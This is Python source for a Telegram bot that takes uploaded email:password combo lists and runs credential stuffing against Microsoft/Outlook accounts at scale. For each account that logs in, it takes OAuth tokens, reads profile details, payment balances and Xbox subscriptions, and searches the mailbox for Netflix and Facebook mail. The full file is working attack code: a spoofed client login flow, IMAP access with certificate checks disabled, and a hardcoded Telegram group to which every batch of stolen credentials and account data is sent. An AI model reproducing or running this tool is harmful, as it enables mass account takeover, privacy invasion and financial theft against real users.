import os
import sys
import time
import json
import uuid
import queue
import threading
import requests
from concurrent.futures import ThreadPoolExecutor
import re
import time
import urllib.parse
import ssl
import imaplib
import base64

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
API_BASE = "https://api.telegram.org/bot"
FILE_BASE = "https://api.telegram.org/file/bot"

def api(method, data=None, files=None):
    r = requests.post(f"{API_BASE}{BOT_TOKEN}/{method}", data=data, files=files, timeout=60)
    return r.json()

def get_updates(offset=None, timeout=30):
    data = {"timeout": timeout}
    if offset:
        data["offset"] = offset
    return api("getUpdates", data)

def send_message(chat_id, text, reply_markup=None):
    data = {"chat_id": chat_id, "text": text}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    return api("sendMessage", data)

def send_document(chat_id, path, caption=None):
    with open(path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": chat_id}
        if caption:
            data["caption"] = caption
        return api("sendDocument", data, files=files)

def get_file(file_id):
    j = api("getFile", {"file_id": file_id})
    if not j.get("ok"):
        return None
    fp = j["result"]["file_path"]
    r = requests.get(f"{FILE_BASE}{BOT_TOKEN}/{fp}", timeout=60)
    return r.content

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=10).text
    except:
        return "unknown"

def parse_accounts_bytes(data):
    lines = data.decode(errors="ignore").splitlines()
    out = []
    seen = set()
    for ln in lines:
        ln = ln.strip()
        if not ln or ":" not in ln:
            continue
        em, pw = ln.split(":", 1)
        em = em.strip()
        pw = pw.strip()
        if not em or not pw or "@" not in em:
            continue
        k = f"{em.lower()}:{pw}"
        if k in seen:
            continue
        seen.add(k)
        out.append((em, pw))
    return out

class UnifiedChecker:
    def __init__(self, debug=False, custom_services=None):
        self.session = requests.Session()
        self.session.trust_env = False
        self.session.proxies = {}
        adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20, max_retries=0)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.services_map = custom_services or {
            'advertise-support.facebook.com': 'Facebook',
            'mail.instagram.com': 'Instagram',
            'x.com': 'Twitter',
            'youtube.com': 'YouTube',
            'discordapp.com': 'Discord',
            'spotify.com': 'Spotify',
            'netflix.com': 'Netflix',
            'steampowered.com': 'Steam',
            'epicgames.com': 'Epic Games',
            'riotgames.com': 'Riot Games',
            'ubisoft.com': 'Ubisoft',
            'blizzard.com': 'Blizzard',
            'rockstargames.com': 'Rockstar',
            'nintendo.com': 'Nintendo',
            'paypal.com': 'PayPal',
            'binance.com': 'Binance',
            'amazon.com': 'Amazon',
            'ea.com': 'EA Sports',
        }

    def log(self, msg):
        if self.debug:
            print(msg)

    def parse_country_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if k in j and j[k]:
                        return str(j[k])
                if 'accounts' in j:
                    for acc in j['accounts']:
                        if isinstance(acc, dict) and acc.get('location'):
                            return str(acc['location'])
        except:
            pass
        return ''

    def parse_name_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['displayName', 'name', 'givenName', 'fullName']:
                    if k in j and j[k]:
                        return str(j[k])
        except:
            pass
        return ''

    def _ms_hard_login(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            h1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=h1, timeout=15)
            if "MSAccount" not in r1.text:
                return None
            time.sleep(0.3)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=15)
            m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
            m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not m_url or not m_ppft:
                return None
            post_url = m_url.group(1).replace("\\/", "/")
            ppft = m_ppft.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            h3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=h3, allow_redirects=False, timeout=10)
            loc = r3.headers.get("Location", "")
            if not loc:
                return None
            m_code = re.search(r'code=([^&]+)', loc)
            if not m_code:
                return None
            code = m_code.group(1)
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
            if r4.status_code != 200 or "access_token" not in r4.text:
                return None
            j = r4.json()
            at = j.get("access_token", "")
            rt = j.get("refresh_token", "")
            cid = (self.session.cookies.get("MSPCID", "") or "").upper()
            return {"access_token": at, "refresh_token": rt, "cid": cid}
        except:
            return None

    def _graph_msg_count(self, at):
        try:
            r = self.session.get("https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
                                 headers={"Authorization": f"Bearer {at}"}, timeout=12)
            if r.status_code == 200:
                return r.json().get("totalItemCount", 0)
        except:
            pass
        return 0

    def _profile(self, at, cid):
        country = ""
        name = ""
        try:
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                 headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"}, timeout=15)
            if r.status_code == 200:
                j = r.json()
                country = self.parse_country_from_json(j)
                name = self.parse_name_from_json(j)
        except:
            pass
        return country, name

    def check_microsoft_subscriptions(self, email, password, at, cid):
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + urllib.parse.quote(state_json)
            r = self.session.get(url, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=20)
            payment_token = None
            text = r.text + " " + r.url
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, text)
                if m:
                    payment_token = urllib.parse.unquote(m.group(1))
                    break
            if not payment_token:
                return {"ms_status": "FREE", "ms_data": {}, "xbox": {"status": "FREE", "details": ""}}
            ms_data = {}
            h = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type": "application/json",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            try:
                pay_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(pay_url, headers=h, timeout=15)
                if r_pay.status_code == 200:
                    m1 = re.search(r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?)', r_pay.text)
                    if m1:
                        ms_data["balance_amount"] = m1.group(1)
                    m2 = re.search(r'"currency(?:Code)?"\s*:\s*"([A-Z]{3})"', r_pay.text)
                    if m2:
                        ms_data["balance_currency"] = m2.group(1)
                    m3 = re.search(r'"availablePoints"\s*:\s*(\d+)', r_pay.text)
                    if m3:
                        ms_data["rewards_points"] = m3.group(1)
            except:
                pass
            xbox = {"status": "FREE", "details": ""}
            try:
                tr_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(tr_url, headers=h, timeout=15)
                if r_sub.status_code == 200:
                    t = r_sub.text
                    kw = {
                        'Xbox Game Pass Ultimate': 'Ultimate',
                        'PC Game Pass': 'PC Game Pass',
                        'EA Play': 'EA Play',
                        'Xbox Live Gold': 'Gold',
                        'Game Pass': 'Game Pass'
                    }
                    for k, nm in kw.items():
                        if k in t:
                            days = "?"
                            m = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', t)
                            if m:
                                days = m.group(1)
                            xbox = {"status": "PREMIUM", "details": nm}
                            break
            except:
                pass
            return {"ms_status": "PREMIUM" if xbox["status"] != "FREE" else "FREE", "ms_data": ms_data, "xbox": xbox}
        except Exception:
            return {"ms_status": "ERROR", "ms_data": {}, "xbox": {"status": "ERROR", "details": ""}}

    def _imap_xoauth2_connect(self, email_addr, access_token, host='outlook.office365.com', port=993):
        try:
            auth_bytes = f"user={email_addr}\x01auth=Bearer {access_token}\x01\x01".encode()
            auth_b64 = base64.b64encode(auth_bytes)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            mail.authenticate('XOAUTH2', lambda _: auth_b64)
            return mail, None
        except Exception as e:
            return None, str(e)[:80]

    def _imap_fetch_latest_from(self, email_addr, access_token, sender_substr, host='imap-mail.outlook.com', count=200):
        try:
            mail, err = self._imap_xoauth2_connect(email_addr, access_token, host, 993)
            if not mail:
                return None, None
            mail.select('INBOX', readonly=True)
            typ, data = mail.search(None, 'ALL')
            ids = data[0].split() if data and data[0] else []
            ids = list(reversed(ids[-count:] if len(ids) > count else ids))
            ss = sender_substr.lower()
            for mid in ids:
                t, md = mail.fetch(mid, '(RFC822)')
                if t != 'OK' or not md:
                    continue
                raw = md[0][1] if isinstance(md[0], tuple) else b''
                msg = email.message_from_bytes(raw)
                frm = (msg.get('From') or '').lower()
                if ss in frm:
                    subj = msg.get('Subject') or ''
                    dt = msg.get('Date') or ''
                    return subj, dt
        except:
            pass
        return None, None

    def check_netflix(self, access_token, cid, email_addr):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            h = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            q = 'profile OR plan OR "Next billing" OR info@account.netflix.com'
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": q},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(url, json=payload, headers=h, timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = 0
                last_s = ""
                last_d = ""
                for es in data.get('EntitySets', []):
                    for rs in es.get('ResultSets', []):
                        total = rs.get('Total', 0)
                        if total > 0 and rs.get('Results'):
                            last = rs['Results'][0]
                            last_s = last.get('Subject', '')
                            last_d = last.get('ReceivedDateTime', '')
                        break
                if not last_s or not last_d:
                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'account.netflix.com')
                    if s2:
                        last_s = s2
                    if d2:
                        last_d = d2
                return {"netflix_status": "LINKED" if total > 0 else "FREE", "netflix_emails": total, "netflix_last_subject": last_s[:100], "netflix_last_date": last_d[:20]}
            return {"netflix_status": "FREE", "netflix_emails": 0}
        except:
            return {"netflix_status": "ERROR", "netflix_emails": 0}

    def check_facebook(self, access_token, cid, email_addr):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            h = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            q = "advertise-support.facebook.com"
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": q},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(url, json=payload, headers=h, timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = 0
                last_s = ""
                last_d = ""
                for es in data.get('EntitySets', []):
                    for rs in es.get('ResultSets', []):
                        total = rs.get('Total', 0)
                        if total > 0 and rs.get('Results'):
                            last = rs['Results'][0]
                            last_s = last.get('Subject', '')
                            last_d = last.get('ReceivedDateTime', '')
                        break
                if not last_s or not last_d:
                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'facebook')
                    if s2:
                        last_s = s2
                    if d2:
                        last_d = d2
                return {"facebook_status": "LINKED" if total > 0 else "FREE", "facebook_emails": total, "facebook_last_subject": last_s[:100], "facebook_last_date": last_d[:20]}
            return {"facebook_status": "FREE", "facebook_emails": 0}
        except:
            return {"facebook_status": "ERROR", "facebook_emails": 0}

    def _scan_services(self, at, cid, email_addr):
        out = {}
        nf = self.check_netflix(at, cid, email_addr)
        fb = self.check_facebook(at, cid, email_addr)
        if nf.get("netflix_status") == "LINKED":
            out["Netflix"] = True
        if fb.get("facebook_status") == "LINKED":
            out["Facebook"] = True
        return out, nf, fb

    def check(self, email, password):
        try:
            auth = self._ms_hard_login(email, password)
            if not auth or not auth.get("access_token"):
                return {"status": "BAD"}
            at = auth["access_token"]
            cid = auth.get("cid", "")
            country, name = self._profile(at, cid)
            msg_count = self._graph_msg_count(at)
            msr = self.check_microsoft_subscriptions(email, password, at, cid)
            services, nf, fb = self._scan_services(at, cid, email)
            result = {
                "status": "HIT",
                "country": country,
                "name": name,
                "msg_count": msg_count,
                "email": email,
                "password": password,
                "services": services,
                "_access_token": at,
                "_refresh_token": auth.get("refresh_token", ""),
                **msr,
                **nf,
                **fb,
                "psn_status": "NONE",
                "steam_status": "NONE",
                "supercell_status": "NONE",
                "tiktok_status": "NONE",
                "minecraft_status": "NONE",
                "hypixel_status": "NOT_FOUND",
            }
            return result
        except requests.exceptions.Timeout:
            return {"status": "BAD"}
        except Exception:
            return {"status": "BAD"}

def build_balance_text(ms_data):
    parts = []
    if isinstance(ms_data, dict):
        if "balance_amount" in ms_data:
            amt = ms_data.get("balance_amount")
            cur = ms_data.get("balance_currency") or ""
            parts.append(f"{amt}{cur}")
        elif "balance" in ms_data:
            parts.append(str(ms_data.get("balance")))
        if "rewards_points" in ms_data:
            parts.append(f"Rewards:{ms_data['rewards_points']}")
    return " | ".join([p for p in parts if p]) if parts else ""

def format_result(res):
    email = res.get("email", "")
    password = res.get("password", "")
    country = (res.get("country") or "??").strip().upper()
    xbox = res.get("xbox", {}) or {}
    xbox_text = xbox.get("details") or xbox.get("status") or "N/A"
    balance_text = build_balance_text(res.get("ms_data", {}))
    hyp_parts = []
    if res.get("hypixel_status") == "FOUND":
        if res.get("hypixel_level"):
            hyp_parts.append(f"Lvl:{res['hypixel_level']}")
        if res.get("hypixel_bw_stars"):
            hyp_parts.append(f"BW★{res['hypixel_bw_stars']}")
        if res.get("hypixel_sb_coins"):
            hyp_parts.append(f"SB:{res['hypixel_sb_coins']}")
    hyp_text = " | ".join(hyp_parts) if hyp_parts else ""
    services = res.get("services", {}) or {}
    svc_list = [k for k, v in services.items() if v]
    svc_text = ", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else "")
    return f"{email}:{password} | {country} | {xbox_text} | {balance_text} | {hyp_text} | {svc_text}"

def _take(lst, n):
    out = []
    for i, v in enumerate(lst):
        if i >= n:
            break
        out.append(v)
    return out

def format_full_details(res):
    lines = []
    email = res.get("email", "")
    country = (res.get("country") or "??").strip().upper()
    name = res.get("name") or ""
    msg_count = res.get("msg_count", 0)
    lines.append(f"Email: {email}")
    lines.append(f"Name: {name}")
    lines.append(f"Country: {country}")
    lines.append(f"Msgs: {msg_count}")
    xbox = res.get("xbox", {}) or {}
    if xbox:
        lines.append(f"Xbox: {xbox.get('details') or xbox.get('status') or 'N/A'}")
    ms = res.get("ms_data", {}) or {}
    btxt = build_balance_text(ms)
    if btxt:
        lines.append(f"Balance: {btxt}")
    if res.get("psn_status") == "HAS_ORDERS":
        cnt = res.get("psn_emails_count", 0)
        orders = res.get("psn_orders", 0)
        ids = res.get("psn_online_ids", []) or []
        lines.append(f"PSN: emails:{cnt} orders:{orders} ids:{', '.join(_take(ids,5))}")
    if res.get("steam_status") == "HAS_PURCHASES":
        cnt = res.get("steam_count", 0)
        games = [p.get("game","") for p in res.get("steam_purchases", []) or []]
        if games:
            lines.append(f"Steam: {cnt} [{'; '.join(_take(games,10))}]")
        else:
            lines.append(f"Steam: {cnt}")
    if res.get("minecraft_status") == "OWNED":
        uname = res.get("minecraft_username","")
        lines.append(f"Minecraft: {uname}")
    if res.get("hypixel_status") == "FOUND":
        hp = []
        if res.get("hypixel_level"):
            hp.append(f"Lvl:{res['hypixel_level']}")
        if res.get("hypixel_bw_stars"):
            hp.append(f"BW★{res['hypixel_bw_stars']}")
        if res.get("hypixel_sb_coins"):
            hp.append(f"SB:{res['hypixel_sb_coins']}")
        if hp:
            lines.append(f"Hypixel: {' | '.join(hp)}")
    if res.get("netflix_status") == "LINKED":
        lines.append(f"Netflix: {res.get('netflix_emails',0)} | {res.get('netflix_last_subject','')[:100]} | {res.get('netflix_last_date','')}")
    if res.get("facebook_status") == "LINKED":
        lines.append(f"Facebook: {res.get('facebook_emails',0)} | {res.get('facebook_last_subject','')[:100]} | {res.get('facebook_last_date','')}")
    if res.get("dazn_status") == "LINKED":
        lines.append(f"Dazn: {res.get('dazn_emails',0)} | {res.get('dazn_last_subject','')[:100]} | {res.get('dazn_last_date','')}")
    if res.get("paypal_status") == "LINKED":
        lines.append(f"PayPal: emails:{res.get('paypal_emails',0)} payments:{res.get('paypal_total_payments',0)}")
    if res.get("epic_status") == "LINKED":
        lines.append(f"Epic: {res.get('epic_emails',0)} | {res.get('epic_last_subject','')[:100]} | {res.get('epic_last_date','')}")
    sv = res.get("services", {}) or {}
    if sv:
        found = [k for k,v in sv.items() if v]
        lines.append(f"Services: {', '.join(_take(found,20))}" + (" ..." if len(found)>20 else ""))
    out = "\n".join(lines)
    if len(out) > 3900:
        out = out[:3900] + "\n..."
    return out

class ScanSession:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.stop_ev = threading.Event()
        self.results = []
        self.total = 0
        self.checked = 0
        self.hits = 0
        self.bads = 0
        self.batch = []
        self.hits_batch_lock = threading.Lock()
        self.last_status_time = 0.0

    def stop(self):
        self.stop_ev.set()

class BotApp:
    def __init__(self):
        self.offset = None
        self.sessions = {}
        self.lock = threading.Lock()

    def _send_status(self, sess: ScanSession, chat_id, force=False):
        now = time.time()
        if not force and now - sess.last_status_time < 5:
            return
        with self.lock:
            msg = f"Progress: {sess.checked}/{sess.total} | Hits: {sess.hits} | Bads: {sess.bads}"
        send_message(chat_id, msg)
        sess.last_status_time = now

    def _flush_batch(self, sess: ScanSession, chat_id):
        with sess.hits_batch_lock:
            if not sess.batch:
                return
            name = f"hits_batch_{int(time.time())}.txt"
            path = os.path.join(os.getcwd(), name)
            try:
                with open(path, "w", encoding="utf-8") as f:
                    f.writelines([ln + "\n" for ln in sess.batch])
                send_document(chat_id, path, caption=f"Hits batch ({len(sess.batch)})")
                try:
                    send_document(GROUP_ID, path, caption=f"Hits batch ({len(sess.batch)})")
                except:
                    pass
                sess.batch.clear()
            except:
                pass

    def start_scan(self, chat_id, accounts):
        sess = ScanSession(chat_id)
        with self.lock:
            self.sessions[chat_id] = sess
        sess.total = len(accounts)
        kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
        send_message(chat_id, f"Started scan: {sess.total} accounts\nIP: {get_ip()}", reply_markup=kb)
        def worker(acc):
            if sess.stop_ev.is_set():
                return
            em, pw = acc
            try:
                checker = UnifiedChecker(debug=False, custom_services=None)
                r = checker.check(em, pw)
            except:
                r = {"status": "BAD"}
            with self.lock:
                sess.checked += 1
            if r and r.get("status") == "HIT":
                line = format_result(r)
                with self.lock:
                    sess.results.append(line)
                    sess.hits += 1
                # Batch-send every 100 hits
                with sess.hits_batch_lock:
                    sess.batch.append(line)
                    if len(sess.batch) >= 100:
                        pass
                if len(sess.batch) >= 100:
                    self._flush_batch(sess, chat_id)
                # periodic status
                self._send_status(sess, chat_id)
            else:
                with self.lock:
                    sess.bads += 1
                # periodic status
                if sess.checked % 20 == 0:
                    self._send_status(sess, chat_id)
        ex = ThreadPoolExecutor(max_workers=50)
        fs = [ex.submit(worker, acc) for acc in accounts]
        for f in fs:
            if sess.stop_ev.is_set():
                break
            try:
                f.result(timeout=60)
            except:
                pass
        try: ex.shutdown(wait=False, cancel_futures=True)
        except: pass
        self.finish(chat_id)

    def finish(self, chat_id):
        with self.lock:
            sess = self.sessions.get(chat_id)
        if not sess:
            return
        # flush remaining batch
        self._flush_batch(sess, chat_id)
        name = f"results_{uuid.uuid4().hex[:8]}.txt"
        path = os.path.join(os.getcwd(), name)
        try:
            with open(path, "w", encoding="utf-8") as f:
                for ln in sess.results:
                    f.write(ln + "\n")
            send_document(chat_id, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
            try:
                send_document(GROUP_ID, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
            except:
                pass
        except:
            send_message(chat_id, "Failed to prepare results")
        with self.lock:
            self.sessions.pop(chat_id, None)

    def handle_file(self, chat_id, file_id):
        data = get_file(file_id)
        if not data:
            send_message(chat_id, "Cannot download file")
            return
        accounts = parse_accounts_bytes(data)
        if not accounts:
            send_message(chat_id, "No valid accounts found")
            return
        t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
        t.start()

    def handle_stop(self, chat_id):
        with self.lock:
            sess = self.sessions.get(chat_id)
        if not sess:
            send_message(chat_id, "No running scan")
            return
        sess.stop()
        send_message(chat_id, "Stopping, preparing results...")

    def run(self):
        if not BOT_TOKEN:
            print("Set TELEGRAM_BOT_TOKEN env")
            return
        while True:
            try:
                j = get_updates(self.offset, timeout=50)
                if not j.get("ok"):
                    time.sleep(2)
                    continue
                for upd in j.get("result", []):
                    self.offset = upd["update_id"] + 1
                    if "message" in upd:
                        m = upd["message"]
                        chat_id = m["chat"]["id"]
                        if "document" in m:
                            fid = m["document"]["file_id"]
                            self.handle_file(chat_id, fid)
                        elif "text" in m and m["text"].strip().lower() == "stop":
                            self.handle_stop(chat_id)
                    elif "callback_query" in upd:
                        cq = upd["callback_query"]
                        data = cq.get("data", "")
                        chat_id = cq["message"]["chat"]["id"]
                        if data.startswith("STOP_"):
                            self.handle_stop(chat_id)
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(2)

if __name__ == "__main__":
    BotApp().run()
